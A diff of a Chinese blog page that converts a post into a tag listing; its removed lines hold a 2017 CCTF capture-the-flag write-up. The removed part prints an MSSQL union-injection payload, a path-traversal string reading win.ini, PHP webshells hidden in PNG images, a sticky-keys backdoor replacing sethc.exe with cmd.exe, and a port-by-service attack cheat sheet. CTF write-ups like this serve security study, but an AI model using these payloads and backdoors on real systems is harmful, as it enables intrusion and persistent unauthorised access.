@@ -6,27 +6,15 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://www.wzsite.cn">
-  <title>CCTF（重庆绿盟杯）比赛writeUp | Wz&#39;s Blog</title>
+  <title>Tag: WriteUp | Wz&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="WEB1靶机只扫描到22的ssh端口那么思路只有一个，只能爆破">
-<meta name="keywords" content="随笔,WriteUp">
-<meta property="og:type" content="article">
-<meta property="og:title" content="CCTF（重庆绿盟杯）比赛writeUp">
-<meta property="og:url" content="https://www.wzsite.cn/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Wz&#39;s Blog">
+<meta property="og:url" content="https://www.wzsite.cn/tags/WriteUp/index.html">
 <meta property="og:site_name" content="Wz&#39;s Blog">
-<meta property="og:description" content="WEB1靶机只扫描到22的ssh端口那么思路只有一个，只能爆破">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-23-66.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-17-21.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-21-28.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-21-47.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-37-40.jpg">
-<meta property="og:image" content="https://www.wzsite.cn/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-40-49.jpg">
-<meta property="og:updated_time" content="2017-09-26T16:58:55.666Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="CCTF（重庆绿盟杯）比赛writeUp">
-<meta name="twitter:description" content="WEB1靶机只扫描到22的ssh端口那么思路只有一个，只能爆破">
-<meta name="twitter:image" content="https://www.wzsite.cn/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-23-66.jpg">
+<meta name="twitter:title" content="Wz&#39;s Blog">
   
     <link rel="alternative" href="/atom.xml" title="Wz&#39;s Blog" type="application/atom+xml">
   
@@ -166,129 +154,36 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-CCTF-重庆绿盟杯-比赛writeUp" class="article article-type-post " itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
+            
   
-    <h1 class="article-title" itemprop="name">
-      CCTF（重庆绿盟杯）比赛writeUp
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2017" class="archive-year">2017</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/" class="archive-article-date">
+  	<time datetime="2017-09-23T17:05:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-24</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/">CCTF（重庆绿盟杯）比赛writeUp</a>
     </h1>
   
 
-        
-        <a href="/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/" class="archive-article-date">
-  	<time datetime="2017-09-23T17:05:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2017-09-24</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <img src="/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-23-66.jpg" alt="21-23-66.jpg" title="">
-<h1 id="WEB1"><a href="#WEB1" class="headerlink" title="WEB1"></a>WEB1</h1><p>靶机只扫描到22的ssh端口<br>那么思路只有一个，只能爆破<br><a id="more"></a><br>用的是一个SSH爆破工具<strong>SSH_Crack</strong><br> <strong>百度云下载链接:</strong><a href="https://pan.baidu.com/s/1qX9lyZM" target="_blank" rel="external">https://pan.baidu.com/s/1qX9lyZM</a><br>然后下几个弱密码字典，放进去跑，然而并没有什么用<br>最后到结束也没跑出来，跑到怀疑人生。结束后问别队，他们说最后半小时出现了一个5984的端口</p>
-<blockquote>
-<p>21 ftp<br>22 SSH<br>23 Telnet<br>80 web<br>80-89 web<br>161 SNMP<br>389 LDAP<br>443 SSL心脏滴血以及一些web漏洞测试<br>445 SMB<br>512,513,514 Rexec<br>873 Rsync未授权<br>1025,111 NFS<br>1433 MSSQL<br>1521 Oracle:(iSqlPlus Port:5560,7778)<br>2082/2083 cpanel主机管理系统登陆 （国外用较多）<br>2222 DA虚拟主机管理系统登陆 （国外用较多）<br>2601,2604 zebra路由，默认密码zebra<br>3128 squid代理默认端口，如果没设置口令很可能就直接漫游内网了<br>3306 MySQL<br>3312/3311 kangle主机管理系统登陆<br>3389 远程桌面<br>4440 rundeck 参考WooYun: 借用新浪某服务成功漫游新浪内网<br>5432 PostgreSQL<br>5900 vnc<br>5984 CouchDB <a href="http://xxx:5984/_utils/" target="_blank" rel="external">http://xxx:5984/_utils/</a><br>6082 varnish 参考WooYun: Varnish HTTP accelerator CLI 未授权访问易导&gt;致网站被直接篡改或者作为代理进入内网<br>6379 redis未授权<br>7001,7002 WebLogic默认弱口令，反序列<br>7778 Kloxo主机控制面板登录<br>8000-9090 都是一些常见的web端口，有些运维喜欢把管理后台开在这些非80的端口上<br>8080 tomcat/WDCP主机管理系统，默认弱口令<br>8080,8089,9090 JBOSS<br>8083 Vestacp主机管理系统 (国外用较多)<br>8649 ganglia<br>8888 amh/LuManager 主机管理系统默认端口<br>9200,9300 elasticsearch 参考WooYun: 多玩某服务器ElasticSearch命令执&gt;行漏洞<br>10000 Virtualmin/Webmin 服务器虚拟主机管理系统<br>11211 memcache未授权访问<br>27017,27018 Mongodb未授权访问<br>28017 mongodb统计页面<br>50000 SAP命令执行<br>50070,50030 hadoop默认端口未授权访问</p>
-</blockquote>
-<p><strong>神坑!!!</strong><br>至于5984端口的利用，就在此留个坑吧，有兴趣的可以查一下资料，本菜就不写了</p>
-<blockquote>
-<p>毕竟在这题浪费了很多时间，再也不想看到这题，23333</p>
-</blockquote>
-<h1 id="WEB2"><a href="#WEB2" class="headerlink" title="WEB2"></a>WEB2</h1><h2 id="MSSQL注入"><a href="#MSSQL注入" class="headerlink" title="MSSQL注入"></a>MSSQL注入</h2><p>比赛当时我找到的是一个shop7z的一个通用注入pkid<br>因为是MSSQL的数据库，不允许limit，故使用order by修改表序列，是一个显式union注入<br><strong>payload:</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Union%0a/!5000SelECt/%0a12,3,4,5,6,7,8,9,10,12,3,4,5,6,7,8,9,10,12,3,4,5,6,7,8,9,10,12,3,4,5,6,7,8,9,10,12,3,4,5,6,7,8%0aMSysAccessObjects%0aorder%0aby%0a1</div></pre></td></tr></table></figure></p>
-<p>因为是MSSQL,我平时积累不多,且把@@version替换上面数字会出false的页面，就懵逼了<br>大早上没吃早餐，被雨淋，还被空调吹得晕乎乎的，就就此放弃琢磨了这一道MSSQL注入，说实话还是积累太少。</p>
-<h1 id="WEB3"><a href="#WEB3" class="headerlink" title="WEB3"></a>WEB3</h1><h2 id="一阶段——上传绕过"><a href="#一阶段——上传绕过" class="headerlink" title="一阶段——上传绕过"></a>一阶段——上传绕过</h2><p><strong>第一步扫描：</strong></p>
-<img src="/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-17-21.jpg" alt="21-17-21.jpg" title="">
-<p>发现开了很多端口<br>其中3389和80和8080是我们特别关注的<br>进去80是一个IIS的建设中的页面，没啥挖掘的<br>8080是一个Apache搭的应用下载市场<br>AWVS扫描发现有用的目录遍历漏洞</p>
-<img src="/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-21-28.jpg" alt="21-21-28.jpg" title="">
-<h5 id="有问题变量在模板参数tpl处"><a href="#有问题变量在模板参数tpl处" class="headerlink" title="有问题变量在模板参数tpl处"></a>有问题变量在模板参数tpl处</h5><p>被设置为../../../../../../../windows/win.ini%00.jpg<br><img src="/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-21-47.jpg" alt="21-21-47.jpg" title=""></p>
-<h3 id="科普"><a href="#科普" class="headerlink" title="科普"></a>科普</h3><p>还是科普一下<br>../是DOS命令及linux的shell命令的上层目录的意思<br>windows/win.ini，可以对照一下你C盘的C:\windows\win.ini<br>是一个系统的配置文件<br>%00是截断符，../回溯至win.ini后将读取win.ini%00.jpg<br>因为windows的读取特性，后缀名.jpg会被截断，将会读取win.ini达到任意文件读取的目的<br>然后其他两名队友Jason&amp;&amp;Unk0wn发现有一个图片上传点，但是上传的文件会被改名成静态图像文件，并且上传会过滤PHP等解析格式<br>随后我就有一个大胆的想法(其实当时只是想死马当活马医)<br>对，就是用目录遍历漏洞包含图像，使得上传的被我插入一句话木马的静态文件解析成php</p>
-<h3 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h3><p>上传点过滤PHP后缀，截断以及该Content-Type无济于事，索性直接上传PNG文件，保留文件头和结束标记，在中间插入一句话<br>大概是这样子的<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> system($_POST[<span class="number">1</span>]);<span class="keyword">echo</span> <span class="number">1</span>;<span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
-<img src="/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-37-40.jpg" alt="21-37-40.jpg" title="">
-<p>然后上传之后记录上传路径,将tpl改成静态png的路径。<br>大概是这样子的</p>
-<img src="/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/21-40-49.jpg" alt="21-40-49.jpg" title="">
-<p>毕竟环境已经关了，无法有更多详细的截图了，实在抱歉</p>
-<p>随后发现Png被解析成php了，并且提示,system()由于某些安全原因被禁用了</p>
-<p>随后就将一句话构造成这样</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span> </div><div class="line">$a=$_POST[<span class="number">2</span>];</div><div class="line"><span class="keyword">echo</span> $a.<span class="string">"\n"</span>;</div><div class="line">$b = scandir($a,<span class="number">1</span>);</div><div class="line">print_r($b);</div><div class="line">phpinfo();</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<p>同样上传图片，包含新图片路径<br>庆幸的是phpinfo()是可以执行的，我们将post数据构造成当前目录路径</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">POST_DATA: <span class="number">2</span>=getcwd();</div></pre></td></tr></table></figure>
-<p>执行后得到当前路径以及当前路径所有文件的名字,具体的路径没截图了，反正是C盘下的路径<br>以及当前目录下的flag_i4_H37e.txt文件<br>利用上面显示win.ini的方法，包含flag_i4_H37e.txt即可得到传马所得flag200分</p>
-<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>因为比赛是有三层靶机，而二层靶机是无法ping通的，所以应该是通过控制WEB3的主机,然后开启ip转发，使得我们能够继续渗透二层靶机。故我们接下来的思路是控制WEB3所在靶机</p>
-<h2 id="比赛宕机"><a href="#比赛宕机" class="headerlink" title="比赛宕机"></a>比赛宕机</h2><h6 id="发生了两次宕机，其中有一次长达半个多小时，比赛才6个小时欲哭无泪"><a href="#发生了两次宕机，其中有一次长达半个多小时，比赛才6个小时欲哭无泪" class="headerlink" title="发生了两次宕机，其中有一次长达半个多小时，比赛才6个小时欲哭无泪"></a>发生了两次宕机，其中有一次长达半个多小时，比赛才6个小时欲哭无泪</h6><h2 id="比赛继续"><a href="#比赛继续" class="headerlink" title="比赛继续"></a>比赛继续</h2><p>通过phpinfo可以知道disable_functions=proc_open,passthru,exec,system,shell_exec,,popen<br>这些函数都被禁用了</p>
-<blockquote>
-<p>proc_open()</p>
-<ul>
-<li>功能描述：执行一个命令并打开文件指针用于读取以及写入。 </li>
-</ul>
-<p>passthru()</p>
-<ul>
-<li>功能描述：允许执行一个外部程序并回显输出，类似于 exec()。</li>
-</ul>
-<p>exec()</p>
-<ul>
-<li>功能描述：允许执行一个外部程序（如 UNIX Shell 或 CMD 命令等）。</li>
-</ul>
-<p>system()</p>
-<ul>
-<li>功能描述：允许执行一个外部程序并回显输出，类似于 passthru()。</li>
-</ul>
-<p>shell_exec()<br>-功能描述：通过 Shell 执行命令，并将执行结果作为字符串返回。 </p>
-<p>popen()</p>
-<ul>
-<li>功能描述：可通过 popen() 的参数传递一条命令，并对 popen() 所打开的文件进行执行。 </li>
-</ul>
-</blockquote>
-<p>那就十分尴尬了<br>我们能解析php但是并不能执行系统函数</p>
-<h2 id="3389-端口"><a href="#3389-端口" class="headerlink" title="3389 端口"></a>3389 端口</h2><p>由于WEB3是开了3389端口，而且我们又能执行php的大部分代码，故我又产生了一个大胆的想法</p>
-<h3 id="经典后门——粘滞键后门"><a href="#经典后门——粘滞键后门" class="headerlink" title="经典后门——粘滞键后门"></a>经典后门——粘滞键后门</h3><ol>
-<li>通过php的copy()函数将C:\WINDOWS\system32\下的sethc.exe替换成cmd.exe</li>
-<li>3389端口远程连接WEB3的靶机</li>
-<li>狂按shift键，召唤出被替换成cmd.exe的程序sethc.exe</li>
-</ol>
-<p>于是将一句换木马插入PNG图片的中间：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">unlink(<span class="string">"C:\\Windows\\system32\\sethc.exe"</span>);</div><div class="line">copy(<span class="string">"C:\\Windows\\system32\\cmd.exe"</span>,<span class="string">"C:\\Windows\\system32\\sethc.exe"</span>);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
-<p>同样的，上传图片木马，包含路径-&gt;解析，然后3389连接WEB3靶机，狂按shift键</p>
-<p>于是很惊喜地发现，cmd.exe被我们召唤出来了</p>
-<p><strong><em>此处图没有机会没保留</em></strong></p>
-<p>于是输入explorer.exe，回车，召唤出桌面来<br>DOS权限还是administrator的</p>
-<p>通过浏览目录发现了桌面下的flag.txt，拿到了最后200分<br>由于本菜太愚钝，最后面几分钟才拿到这200分,<strong>真刺激</strong></p>
-<p>其实我们在构造shift之前我们已经能控制目录，浏览目录，直接找到桌面下的flag.txt了<br>但是要进入第二层靶机必须要控制WEB3的靶机<br>故这一步还是十分关键的<br>虽然后面没有时间用WEB3靶机代理继续渗透二层靶机(比赛完听大佬说二层靶机是wordpress的最近版还是挺难的)，也不算太遗憾吧</p>
-<h2 id="至此比赛结束"><a href="#至此比赛结束" class="headerlink" title="至此比赛结束"></a>至此比赛结束</h2><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>有以下几点：</p>
-<ul>
-<li>以后打比赛一定要吃早餐</li>
-<li>一定不能淋雨吹空调</li>
-<li>以及还是太菜，继续努力吧</li>
-</ul>
-
-      
-
-      
-        <div class="page-reward">
-          <a href="javascript:;" class="page-reward-btn tooltip-top">
-            <div class="tooltip tooltip-east">
-            <span class="tooltip-item">
-              赏
-            </span>
-            <span class="tooltip-content">
-              <span class="tooltip-text">
-                <span class="tooltip-inner">
-                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
-                  <div class="reward-box">
-                    
-                    
-                  </div>
-                </span>
-              </span>
-            </span>
-          </div>
-          </a>
-        </div>
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
+        <div class="article-info info-on-right">
+          
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -304,106 +199,19 @@
 		</ul>
 	</div>
 
-      
+          
 
-      
-
-      
-        
-<div class="share-btn share-icons tooltip-left">
-  <div class="tooltip tooltip-east">
-    <span class="tooltip-item">
-      <a href="javascript:;" class="share-sns share-outer">
-        <i class="icon icon-share"></i>
-      </a>
-    </span>
-    <span class="tooltip-content">
-      <div class="share-wrap">
-        <div class="share-icons">
-          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
-            <i class="icon icon-weibo"></i>
-          </a>
-          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
-            <i class="icon icon-weixin"></i>
-          </a>
-          <a class="qq share-sns" href="javascript:;" data-type="qq">
-            <i class="icon icon-qq"></i>
-          </a>
-          <a class="douban share-sns" href="javascript:;" data-type="douban">
-            <i class="icon icon-douban"></i>
-          </a>
-          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
-            <i class="icon icon-qzone"></i>
-          </a>
-          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
-            <i class="icon icon-facebook"></i>
-          </a>
-          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
-            <i class="icon icon-twitter"></i>
-          </a>
-          <a class="google share-sns" href="javascript:;" data-type="google">
-            <i class="icon icon-google"></i>
-          </a>
         </div>
-      </div>
-    </span>
-  </div>
-</div>
-
-<div class="page-modal wx-share js-wx-box">
-    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <div class="wx-qrcode">
-      <img src="http://s.jiathis.com/qrcode.php?url=https://www.wzsite.cn/2017/09/24/CCTF-重庆绿盟杯-比赛writeUp/" alt="微信分享二维码">
-    </div>
-</div>
-
-<div class="mask js-mask"></div>
-      
-      <div class="clearfix"></div>
-    </div>
+        <div class="clearfix"></div>
+    </header>
   </div>
 </article>
-
-  
-<nav id="article-nav">
   
   
-    <a href="/2017/09/22/Notice/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">Notice</div>
-      <i class="icon-circle-right"></i>
-    </a>
-  
-</nav>
-
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-  
-  
+    </div></section>
   
 
-  
-
-  
-
-  
+    
 
 
           </div>
@@ -426,9 +234,9 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: true,
+		isPost: false,
 		isArchive: false,
-		isTag: false,
+		isTag: true,
 		isCategory: false,
 		open_in_new: false,
 		toc_hide_index: true,
